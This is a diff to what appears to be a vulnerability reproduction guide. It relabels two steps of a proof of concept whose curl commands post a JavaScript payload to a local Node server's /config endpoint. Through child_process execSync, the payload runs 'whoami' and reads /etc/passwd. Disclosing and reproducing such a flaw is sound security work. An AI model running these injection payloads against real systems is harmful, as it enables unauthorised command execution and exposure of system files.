@@ -109,7 +109,7 @@ http.createServer(async (req, res) => {
 node server.js
 ```
 
-#### 4. Inject malicious payload
+#### 4. Inject malicious payload (command: whoami)
 ```bash
 curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("whoami").toString() })()'
 ```
@@ -125,7 +125,7 @@ curl -X POST http://localhost:3000/register   -H "Content-Type: application/json
 ```
 *Note: Output varies depending on the server environment (e.g., "root", "ubuntu", "www-data", etc.)*
 
-#### Arbitrary Command Example
+#### Arbitrary Command Example (command: cat /etc/passwd)
 ```bash
 curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("cat /etc/passwd").toString() })()'
 ```
